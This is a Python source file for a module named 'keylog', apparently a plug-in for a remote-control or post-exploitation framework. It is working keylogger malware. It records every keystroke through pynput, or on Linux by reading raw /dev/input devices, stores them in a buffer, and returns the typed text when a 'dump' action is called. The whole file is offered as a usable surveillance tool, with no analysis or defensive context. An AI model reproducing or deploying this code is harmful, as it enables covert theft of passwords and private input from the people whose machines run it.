NAME = "keylog"
VERSION = "1.0.0"
DESCRIPTION = "Keylogger with circular buffer. pynput primary, /dev/input fallback on Linux."
AUTHOR = "lucy"
DEPENDENCIES = ["pynput>=1.7"]
OS_COMPAT = ["windows", "linux", "darwin"]


import collections
import platform
import threading
import time

_BUFFER_SIZE = 4096
_buffer: collections.deque = collections.deque(maxlen=_BUFFER_SIZE)
_listener_thread = None
_listener = None
_running = False
_lock = threading.Lock()
_window_buffer: list[str] = []


class ModuleError(Exception):
    pass


def run(action: str, params: dict) -> dict:
    if action == "start":
        return _start(params)
    elif action == "stop":
        return _stop()
    elif action == "dump":
        return _dump(params)
    elif action == "clear":
        return _clear()
    elif action == "status":
        return {"status": "completed", "data": {"running": _running, "buffered": len(_buffer)}}
    return {"status": "failed", "data": None, "error": f"Unknown action: {action}"}


def _start(params: dict) -> dict:
    global _listener, _running, _listener_thread

    if _running:
        return {"status": "completed", "data": {"message": "Already running"}}

    try:
        from pynput import keyboard

        def _on_press(key):
            with _lock:
                try:
                    _buffer.append(key.char or "")
                except AttributeError:
                    _buffer.append(f"[{key.name}]")

        _listener = keyboard.Listener(on_press=_on_press)
        _listener.start()
        _running = True
        return {"status": "completed", "data": {"message": "Keylogger started (pynput)"}}

    except ImportError:
        pass

    if platform.system() == "Linux":
        return _start_linux_fallback()

    return {"status": "failed", "data": None, "error": "No keylog backend available"}


def _start_linux_fallback() -> dict:
    global _running, _listener_thread

    import glob, struct

    def _read_events():
        dev_path = None
        for path in sorted(glob.glob("/dev/input/event*")):
            try:
                with open(path, "rb") as f:
                    f.read(1)
                dev_path = path
                break
            except Exception:
                continue

        if not dev_path:
            return

        KEY_MAP = {
            2: "1", 3: "2", 4: "3", 5: "4", 16: "q", 17: "w", 18: "e",
            30: "a", 31: "s", 32: "d", 57: " ", 28: "[ENTER]", 14: "[BS]",
        }

        try:
            with open(dev_path, "rb") as f:
                while _running:
                    raw = f.read(24)
                    if not raw:
                        break
                    _, _, evtype, evcode, evval = struct.unpack("llHHi", raw)
                    if evtype == 1 and evval == 1:
                        with _lock:
                            _buffer.append(KEY_MAP.get(evcode, f"[{evcode}]"))
        except Exception:
            pass

    _listener_thread = threading.Thread(target=_read_events, daemon=True)
    _listener_thread.start()
    _running = True
    return {"status": "completed", "data": {"message": "Keylogger started (/dev/input)"}}


def _stop() -> dict:
    global _listener, _running
    _running = False
    if _listener:
        try:
            _listener.stop()
        except Exception:
            pass
        _listener = None
    return {"status": "completed", "data": {"message": "Keylogger stopped", "buffered": len(_buffer)}}


def _dump(params: dict) -> dict:
    n = int(params.get("last_n", len(_buffer)))
    with _lock:
        entries = list(_buffer)[-n:]
    return {
        "status": "completed",
        "data": {
            "keys": entries,
            "text": "".join(entries),
            "count": len(entries),
            "running": _running,
        },
    }


def _clear() -> dict:
    with _lock:
        _buffer.clear()
    return {"status": "completed", "data": {"message": "Buffer cleared"}}
